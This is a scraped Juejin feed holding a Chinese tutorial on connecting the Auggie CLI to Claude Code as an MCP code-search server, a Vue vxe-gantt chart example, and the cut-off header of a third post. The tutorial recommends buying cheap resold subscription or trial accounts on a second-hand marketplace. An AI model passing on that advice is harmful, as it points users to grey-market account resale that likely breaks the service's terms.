<p>需要用到的是订阅或者试用账户（这个简单， 小黄鱼上大概 5 左右可以买到一个月的）</p>
<p>普通号我已经替大家试过了，没办法建立索引！</p>
<p>接下来我们在 Claude Code 为例，（后文简称 CC） 演示如何接入并使用</p>
<h2 data-id="heading-1">安装配置 Auggie</h2>
<p>先安装 Auggie CLI</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g @augmentcode/auggie@prerelease
</code></pre>
<p>登录 Augment</p>
<pre><code class="hljs">auggie login
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/306e5c9a23e5460788a8f2299e8f1f57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=tgHU%2BAxBOPVk5T%2F4M7AHFbcPEdU%3D" alt="登录 Augment" loading="lazy"/></p>
<p>会自动打开浏览器，使用 augment 账号正常登录即可</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60106b4a10024cb1a256e4123255a320~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=UP0vB2G2TtoljzGwydizeFjJmGE%3D" alt="登录成功" loading="lazy"/></p>
<p>登录成功后复制这串 json，粘贴到控制台后回车，登录成功</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2de2147cc66a4311b94a7622b9a85fb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=ldHaKYQOVZrrMrNxEfIUMhidpac%3D" alt="粘贴后回车" loading="lazy"/></p>
<p>回车，开始建立当前项目索引</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18dfcae8959c4b0fac027af3ee3cafc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=ti%2FVC99S2nBBhbuZ%2B8Q2f7qMtAE%3D" alt="索引建立成功" loading="lazy"/></p>
<p>选 <code>Y</code> 回车，开始建立索引，成功后会显示 <code>Indexing complete</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32dea237a0434932942ef63bcb21b715~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=19YxdfKlRc2wZV4UU%2FoHrL0Qbe0%3D" alt="进入 Auggie" loading="lazy"/></p>
<h2 data-id="heading-2">配置 mcp</h2>
<p>在 CC 中配置 mcp 服务器</p>
<pre><code class="hljs language-bash" lang="bash">claude mcp add-json auggie-mcp <span class="hljs-string">'{"type":"stdio","command":"auggie","args":["--mcp"]}'</span>
</code></pre>
<p>注意这个默认是项目级的 mcp 配置，仅对当前项目生效。如果您想配置为全局的 mcp 服务，请在上述命令后面添加 <code>--scope user</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e365e8db5a4a46a7f9b36281461cd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=jrOK1z98wJa9BiSGWuI2NPb8s1w%3D" alt="2025-12-03-10-33-57" loading="lazy"/></p>
<p>接下来运行 <code>claude</code>，输入 <code>/mcp</code> 指令查看 mcp 服务器是否配置成功</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91d8786c6719414d90e8916117099b64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=SemBbDp%2FoGvTCdlXO7EfrDtqP1g%3D" alt=" 查看 mcp 服务状态" loading="lazy"/></p>
<p>看看 cc 能不能访问到 mcp</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/942aa23eae714d13ac486e362901162e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=TL1wycnpXEioqZck7l5MNtkkAmU%3D" alt="查看 mcp 在对话中的访问状态" loading="lazy"/></p>
<p>用 mcp 进行查询</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84c22727f0154668a4dce62dacedf428~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=YZKRaaBsaH4zRoSq%2Fmwk8I%2B3pYE%3D" alt="使用 mcp 进行检索查询" loading="lazy"/></p>
<p>当然，你也可以在 <code>~/.claude/CLAUDE.md</code> 追加一条全局提示词：</p>
<pre><code class="hljs language-arduino" lang="arduino">默认使用 <span class="hljs-string">"auggie-mcp"</span> 工具进行代码检索
</code></pre>
<p>这样，你只管正常对话即可，cc 会默认通过 auggie-mcp 去进行代码检索</p>
<p>完事儿～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vxe-gantt 甘特图实现产品进度列表，自定义任务条样式和提示信息]]></title>    <link>https://juejin.cn/post/7580270531470573614</link>    <guid>https://juejin.cn/post/7580270531470573614</guid>    <pubDate>2025-12-06T14:32:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580270531470573614" data-draft-id="7580270531470557230" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vxe-gantt 甘特图实现产品进度列表，自定义任务条样式和提示信息"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-06T14:32:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户84179481456"/> <meta itemprop="url" content="https://juejin.cn/user/3921272428567529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vxe-gantt 甘特图实现产品进度列表，自定义任务条样式和提示信息
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3921272428567529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户84179481456
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T14:32:54.000Z" title="Sat Dec 06 2025 14:32:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>vxe-gantt 甘特图实现产品进度列表，自定义任务条样式和提示信息</p>
<p>查看官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgantt.vxeui.com%2F" target="_blank" title="https://gantt.vxeui.com/" ref="nofollow noopener noreferrer">gantt.vxeui.com/</a><br/>
gitbub：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fx-extends%2Fvxe-gantt" target="_blank" title="https://github.com/x-extends/vxe-gantt" ref="nofollow noopener noreferrer">github.com/x-extends/v…</a><br/>
gitee：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fx-extends%2Fvxe-gantt" target="_blank" title="https://gitee.com/x-extends/vxe-gantt" ref="nofollow noopener noreferrer">gitee.com/x-extends/v…</a></p>
<h2 data-id="heading-0">效果</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e67087f4f19f4cfeac88be280b6615e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODQxNzk0ODE0NTY=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765636373&amp;x-signature=eDZzr9d%2BxOltux7XzV7fs99PqfE%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-1">代码</h2>
<p>通过 task-view-config.viewStyle.cellStyle 设置任务视图单元格样式，使用 taskBar、taskBarTooltip 插槽来自定义模板</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-gantt</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"ganttOptions"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">task-bar</span>=<span class="hljs-string">"{ row }"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-task-bar"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ backgroundColor: row.bgColor }"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-task-bar-img"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">vxe-image</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"row.imgUrl"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"60"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"60"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-image</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{{ row.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>开始日期：{{ row.start }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>结束日期：{{ row.end }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>进度：{{ row.progress }}%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">task-bar-tooltip</span>=<span class="hljs-string">"{ row }"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>任务名称：{{ row.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>开始时间：{{ row.start }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>结束时间：{{ row.end }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>进度：{{ row.progress }}%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">vxe-gantt</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> ganttOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">border</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-number">600</span>,
  <span class="hljs-attr">cellConfig</span>: {
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>
  },
  <span class="hljs-attr">taskViewConfig</span>: {
    <span class="hljs-attr">tableStyle</span>: {
      <span class="hljs-attr">width</span>: <span class="hljs-number">380</span>
    },
    <span class="hljs-attr">showNowLine</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">scales</span>: [
      { <span class="hljs-attr">type</span>: <span class="hljs-string">'month'</span> },
      {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'day'</span>,
        headerCellStyle ({ dateObj }) {
          <span class="hljs-comment">// 周日高亮</span>
          <span class="hljs-keyword">if</span> (dateObj.<span class="hljs-property">e</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> {
              <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#f9f0f0'</span>
            }
          }
          <span class="hljs-keyword">return</span> {}
        }
      },
      {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'date'</span>,
        headerCellStyle ({ dateObj }) {
          <span class="hljs-comment">// 周日高亮</span>
          <span class="hljs-keyword">if</span> (dateObj.<span class="hljs-property">e</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> {
              <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#f9f0f0'</span>
            }
          }
          <span class="hljs-keyword">return</span> {}
        }
      }
    ],
    <span class="hljs-attr">viewStyle</span>: {
      cellStyle ({ dateObj }) {
        <span class="hljs-comment">// 周日高亮</span>
        <span class="hljs-keyword">if</span> (dateObj.<span class="hljs-property">e</span> === <span class="hljs-number">0</span>) {
          <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#f9f0f0'</span>
          }
        }
        <span class="hljs-keyword">return</span> {}
      }
    }
  },
  <span class="hljs-attr">taskBarConfig</span>: {
    <span class="hljs-attr">showTooltip</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">barStyle</span>: {
      <span class="hljs-attr">round</span>: <span class="hljs-literal">true</span>
    }
  },
  <span class="hljs-attr">columns</span>: [
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'title'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务名称'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'start'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'开始时间'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">100</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'end'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'结束时间'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">100</span> }
  ],
  <span class="hljs-attr">data</span>: [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10001</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务1'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-03-03'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-03-10'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#c1c452'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product9.png'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10002</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务2'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-03-05'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-03-12'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#fd9393'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product8.png'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务3'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-03-10'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-03-21'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">25</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#92c1f1'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product1.png'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务4'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-03-15'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-03-24'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">70</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#fad06c'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product3.png'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务5'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-03-20'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-04-05'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">50</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#e78dd2'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product11.png'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务6'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-03-22'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-03-29'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#8be1e6'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product7.png'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务7'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-03-28'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-04-04'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#78e6d1'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product5.png'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'任务8'</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">'2024-04-05'</span>, <span class="hljs-attr">end</span>: <span class="hljs-string">'2024-04-18'</span>, <span class="hljs-attr">progress</span>: <span class="hljs-number">65</span>, <span class="hljs-attr">bgColor</span>: <span class="hljs-string">'#edb695'</span>, <span class="hljs-attr">imgUrl</span>: <span class="hljs-string">'https://vxeui.com/resource/productImg/product4.png'</span> }
  ]
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.custom-task-bar</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: row;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
}
<span class="hljs-selector-class">.custom-task-bar-img</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: row;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">70px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">70px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fx-extends%2Fvxe-gantt" target="_blank" title="https://gitee.com/x-extends/vxe-gantt" ref="nofollow noopener noreferrer">gitee.com/x-extends/v…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Virtual World 03】上帝之手]]></title>    <link>https://juejin.cn/post/7580287891273580607</link>    <guid>https://juejin.cn/post/7580287891273580607</guid>    <pubDate>2025-12-06T14:58:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580287891273580607" data-draft-id="7579256547788816425" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Virtual World 03】上帝之手"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-06T14:58:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大怪v"/> <meta itemprop="url" content="https://juejin.cn/user/4391901700043284"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Virtual World 03】上帝之手
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4391901700043284/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大怪v
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T14:58:51.000Z" title="Sat Dec 06 2025 14:58:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
